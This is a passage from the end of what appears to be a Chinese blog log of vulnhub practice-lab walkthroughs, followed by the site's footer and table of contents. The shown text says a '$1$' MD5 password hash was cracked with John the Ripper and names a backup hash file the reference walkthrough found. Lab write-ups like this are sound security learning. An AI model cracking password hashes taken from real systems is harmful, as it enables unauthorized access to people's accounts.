<p>在这里可以看到 $1$ 表示了用的是 MD5 的加密方法，利用 john 来对该密码进行枚举破解。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230502200355709.png" alt="image-20230502200355709"></p>
<p>wp说是找到敏感文件，但是我没想通是怎么找到的。。。<code>/var/backups/passbkp/md5-hash</code></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/links/">links</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS%EF%BC%9AOS-HACKNOS"><span class="toc-number">2.</span> <span class="toc-text">HACKNOS：OS-HACKNOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TROLLCAVE-1-2"><span class="toc-number">3.</span> <span class="toc-text">TROLLCAVE: 1.2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-HAX"><span class="toc-number">4.</span> <span class="toc-text">HACKNOS: OS-HAX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-BYTESEC"><span class="toc-number">5.</span> <span class="toc-text">HACKNOS: OS-BYTESEC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CYNIX-1"><span class="toc-number">6.</span> <span class="toc-text">CYNIX: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-HACKNOS-3"><span class="toc-number">7.</span> <span class="toc-text">HACKNOS: OS-HACKNOS-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ME-AND-MY-GIRLFRIEND-1"><span class="toc-number">8.</span> <span class="toc-text">ME AND MY GIRLFRIEND: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CONNECT-THE-DOTS-1"><span class="toc-number">9.</span> <span class="toc-text">CONNECT THE DOTS: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DJINN-1"><span class="toc-number">10.</span> <span class="toc-text">DJINN: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOMDOM-1"><span class="toc-number">11.</span> <span class="toc-text">DOMDOM: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HACKNOS-OS-HACKNOS-2-1"><span class="toc-number">12.</span> <span class="toc-text">HACKNOS: OS-HACKNOS-2.1</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/30/Penetration/vulnhub/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/30/Penetration/vulnhub/&text=vulnhub 靶场记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/30/Penetration/vulnhub/&is_video=false&description=vulnhub 靶场记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=vulnhub 靶场记录&body=Check out this article: http://example.com/2023/04/30/Penetration/vulnhub/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/30/Penetration/vulnhub/&title=vulnhub 靶场记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/30/Penetration/vulnhub/&name=vulnhub 靶场记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/30/Penetration/vulnhub/&t=vulnhub 靶场记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    Pursue
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
